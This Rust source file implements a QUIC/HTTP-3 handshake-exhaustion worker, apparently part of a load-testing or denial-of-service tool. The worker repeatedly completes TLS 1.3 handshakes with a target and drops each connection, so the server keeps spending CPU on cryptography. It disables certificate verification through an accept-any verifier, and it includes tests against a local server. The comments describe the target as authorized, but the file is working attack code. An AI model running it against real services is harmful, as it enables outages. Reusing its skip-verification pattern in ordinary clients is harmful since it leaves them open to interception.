//! QUIC / HTTP-3 handshake-exhaustion worker (L4/5).
//!
//! Repeatedly establishes a full QUIC connection to the target and drops it. A
//! QUIC handshake is a TLS 1.3 exchange over UDP: cheap for us to start, but the
//! server pays the asymmetric crypto (key exchange, signature) plus per-attempt
//! connection state, the same shape of asymmetry as `tls_exhaust` but on the
//! UDP/QUIC path that fronts modern HTTP/3 stacks. Churning connections (open,
//! complete the handshake, close, repeat) maximises that handshake CPU.
//!
//! Built on `quinn`; there is no sane way to hand-roll QUIC's Initial-packet
//! crypto and header protection correctly. The ALPN is `h3`, so it targets
//! HTTP/3 endpoints. We do NOT validate the server certificate — we are
//! generating load against an authorized target, not acting as a client — so a
//! permissive verifier lets the handshake complete against any cert.
//!
//! NOTE: reaching QUIC needs the target to actually speak it on the UDP port
//! (usually 443/udp). Many origins only expose HTTP/3 at the CDN edge.

use super::{Governor, Metrics, Shutdown};
use anyhow::{Context, Result};
use quinn::crypto::rustls::QuicClientConfig;
use std::net::SocketAddr;
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;

/// Cap on how long a single handshake may take before we abandon it. Shutdown is
/// raced separately, so this only bounds a stalled (non-shutdown) attempt.
const HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(5);

/// A rustls verifier that accepts any server certificate. QUIC mandates TLS 1.3
/// and always presents a cert; we are attacking an authorized target, not
/// authenticating it, so verification is intentionally skipped.
#[derive(Debug)]
struct AcceptAnyCert(Arc<rustls::crypto::CryptoProvider>);

impl rustls::client::danger::ServerCertVerifier for AcceptAnyCert {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &rustls::pki_types::CertificateDer<'_>,
        dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        rustls::crypto::verify_tls12_signature(message, cert, dss, &self.0.signature_verification_algorithms)
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &rustls::pki_types::CertificateDer<'_>,
        dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        rustls::crypto::verify_tls13_signature(message, cert, dss, &self.0.signature_verification_algorithms)
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        self.0.signature_verification_algorithms.supported_schemes()
    }
}

/// Build the QUIC client config: TLS 1.3 only (QUIC requires it), ALPN `h3`,
/// certificate verification disabled.
fn client_config() -> Result<quinn::ClientConfig> {
    let provider = Arc::new(rustls::crypto::ring::default_provider());
    let mut tls = rustls::ClientConfig::builder_with_provider(provider.clone())
        .with_protocol_versions(&[&rustls::version::TLS13])
        .context("rustls TLS1.3")?
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(AcceptAnyCert(provider)))
        .with_no_client_auth();
    tls.alpn_protocols = vec![b"h3".to_vec()];
    Ok(quinn::ClientConfig::new(Arc::new(QuicClientConfig::try_from(tls)?)))
}

/// Bind a client endpoint (ephemeral UDP socket) matching the target's family and
/// set the h3 client config as its default.
pub fn endpoint(target: SocketAddr) -> Result<quinn::Endpoint> {
    let bind: SocketAddr = if target.is_ipv6() {
        "[::]:0".parse().unwrap()
    } else {
        "0.0.0.0:0".parse().unwrap()
    };
    let mut ep = quinn::Endpoint::client(bind).context("bind QUIC client socket")?;
    ep.set_default_client_config(client_config()?);
    Ok(ep)
}

pub async fn worker(
    idx: u32,
    endpoint: quinn::Endpoint,
    addr: SocketAddr,
    server_name: Arc<str>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
) {
    let mut down = shutdown.subscribe();

    loop {
        if *down.borrow() {
            return;
        }
        if !gov.active(idx) {
            tokio::select! {
                _ = down.changed() => {}
                _ = tokio::time::sleep(Duration::from_millis(100)) => {}
            }
            continue;
        }

        metrics.requests_sent.fetch_add(1, Relaxed);
        // `connect` only validates args and starts the handshake; the await drives
        // it. Race the await against the stop signal and a handshake cap.
        let connecting = match endpoint.connect(addr, &server_name) {
            Ok(c) => c,
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
                backoff(&mut down).await;
                continue;
            }
        };
        let outcome = tokio::select! {
            r = connecting => Some(r),
            _ = tokio::time::sleep(HANDSHAKE_TIMEOUT) => None,
            _ = down.changed() => return,
        };
        match outcome {
            Some(Ok(conn)) => {
                // Handshake completed — the server did the crypto. Churn it: close
                // immediately so the next round forces a fresh handshake.
                metrics.responses_ok.fetch_add(1, Relaxed);
                conn.close(0u32.into(), b"");
            }
            Some(Err(_)) | None => {
                metrics.errors.fetch_add(1, Relaxed);
                backoff(&mut down).await;
            }
        }
    }
}

/// Short backoff after a failed handshake, waking immediately on shutdown, so a
/// refusing target can't spin a worker into a busy reconnect loop.
async fn backoff(down: &mut tokio::sync::watch::Receiver<bool>) {
    tokio::select! {
        _ = tokio::time::sleep(Duration::from_millis(50)) => {}
        _ = down.changed() => {}
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn client_config_builds_with_h3_alpn() {
        // Exercises the rustls provider + TLS1.3 + permissive verifier path.
        let cfg = client_config();
        assert!(cfg.is_ok(), "quic client config should build: {:?}", cfg.err());
    }

    #[tokio::test] // quinn::Endpoint::client needs a running Tokio runtime
    async fn endpoint_binds_an_ipv4_client() {
        assert!(endpoint("127.0.0.1:443".parse().unwrap()).is_ok());
        // An IPv6 target picks the [::]:0 bind; whether that succeeds depends on
        // the host having IPv6 (CI/sandboxes often don't), so we only assert it
        // doesn't panic — a bind failure returns Err and the vector is skipped.
        let _ = endpoint("[::1]:443".parse().unwrap());
    }

    // Full end-to-end handshake against a real in-process quinn server, proving
    // the client config actually completes a QUIC/TLS1.3 handshake.
    #[tokio::test]
    async fn completes_a_real_quic_handshake() {
        use quinn::{Endpoint, ServerConfig};

        // Self-signed cert for localhost.
        let cert = rcgen::generate_simple_self_signed(vec!["localhost".into()]).unwrap();
        let cert_der = rustls::pki_types::CertificateDer::from(cert.cert.der().to_vec());
        let key_der =
            rustls::pki_types::PrivatePkcs8KeyDer::from(cert.key_pair.serialize_der()).into();
        let mut server_crypto = rustls::ServerConfig::builder_with_provider(Arc::new(
            rustls::crypto::ring::default_provider(),
        ))
        .with_protocol_versions(&[&rustls::version::TLS13])
        .unwrap()
        .with_no_client_auth()
        .with_single_cert(vec![cert_der], key_der)
        .unwrap();
        server_crypto.alpn_protocols = vec![b"h3".to_vec()];
        let server_cfg = ServerConfig::with_crypto(Arc::new(
            quinn::crypto::rustls::QuicServerConfig::try_from(server_crypto).unwrap(),
        ));

        let server = Endpoint::server(server_cfg, "127.0.0.1:0".parse().unwrap()).unwrap();
        let addr = server.local_addr().unwrap();
        tokio::spawn(async move {
            if let Some(incoming) = server.accept().await {
                let _ = incoming.await; // complete the handshake, then drop
            }
        });

        let ep = endpoint(addr).unwrap();
        let connecting = ep.connect(addr, "localhost").unwrap();
        let conn = tokio::time::timeout(Duration::from_secs(5), connecting).await;
        assert!(conn.is_ok(), "handshake timed out");
        assert!(conn.unwrap().is_ok(), "handshake failed");
    }
}
